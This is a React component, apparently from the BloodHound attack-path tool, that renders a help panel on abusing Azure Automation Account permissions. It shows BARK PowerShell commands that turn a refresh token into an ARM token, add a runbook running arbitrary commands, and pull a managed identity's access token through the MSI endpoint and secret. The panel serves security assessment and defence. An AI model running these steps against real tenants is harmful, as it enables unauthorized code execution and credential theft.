// Copyright 2023 Specter Ops, Inc.
//
// Licensed under the Apache License, Version 2.0
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

import { FC } from 'react';
import { Typography } from '@mui/material';

const Abuse: FC = () => {
    return (
        <>
            <Typography variant='body2'>
                You can use BARK's New-AzureAutomationAccountRunBook and Get-AzureAutomationAccountRunBookOutput
                functions to execute arbitrary commands against the target Automation Account.
            </Typography>

            <Typography variant='body2'>
                These functions require you to supply an Azure Resource Manager scoped JWT associated with the principal
                that has the privilege to add or modify and run Automation Account run books. There are several ways to
                acquire a JWT. For example, you may use BARK's Get-ARMTokenWithRefreshToken to acquire an Azure
                RM-scoped JWT by supplying a refresh token:
            </Typography>

            <Typography component={'pre'}>
                {'$ARMToken = Get-ARMTokenWithRefreshToken ` \n' +
                    '    -RefreshToken "0.ARwA6WgJJ9X2qk…" ` \n' +
                    '    -TenantID "contoso.onmicrosoft.com"'}
            </Typography>

            <Typography variant='body2'>
                Now you can use BARK's New-AzureAutomationAccountRunBook function to add a new runbook to the target
                Automation Account, specifying a command to execute using the -Script parameter:
            </Typography>

            <Typography component={'pre'}>
                {'New-AzureAutomationAccountRunBook `\n' +
                    '    -Token $ARMToken `\n' +
                    '    -RunBookName "MyCoolRunBook" `\n' +
                    '    -AutomationAccountPath "https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/AutomationAccts/providers/Microsoft.Automation/automationAccounts/MyCoolAutomationAccount" `\n' +
                    '    -Script "whoami"'}
            </Typography>

            <Typography variant='body2'>
                After adding the new runbook, you must execute it and fetch its output. You can do this automatically
                with BARK's Get-AzureAutomationAccountRunBookOutput function:
            </Typography>

            <Typography component={'pre'}>
                {'Get-AzureAutomationAccountRunBookOutput `\n' +
                    '    -Token $ARMToken `\n' +
                    '    -RunBookName "MyCoolRunBook" `\n' +
                    '    -AutomationAccountPath "https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/AutomationAccts/providers/Microsoft.Automation/automationAccounts/MyCoolAutomationAccount"'}
            </Typography>

            <Typography variant='body2'>
                If the Automation Account has a managed identity assignment, you can use these two functions to retrieve
                a JWT for the service principal like this:
            </Typography>

            <Typography component={'pre'}>
                {'$Script = $tokenAuthURI = $env:MSI_ENDPOINT + "?resource=https://graph.microsoft.com/&api-version=2017-09-01"; $tokenResponse = Invoke-RestMethod -Method Get -Headers @{"Secret"="$env:MSI_SECRET"} -Uri $tokenAuthURI; $tokenResponse.access_token\n' +
                    'New-AzureAutomationAccountRunBook -Token $ARMToken -RunBookName "MyCoolRunBook" -AutomationAccountPath "https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/AutomationAccts/providers/Microsoft.Automation/automationAccounts/MyCoolAutomationAccount" -Script $Script\n' +
                    'Get-AzureAutomationAccountRunBookOutput -Token $ARMToken -RunBookName "MyCoolRunBook" -AutomationAccountPath "https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/AutomationAccts/providers/Microsoft.Automation/automationAccounts/MyCoolAutomationAccount"'}
            </Typography>

            <Typography variant='body2'>
                If successful, the output will include a JWT for the managed identity service principal.
            </Typography>
        </>
    );
};

export default Abuse;
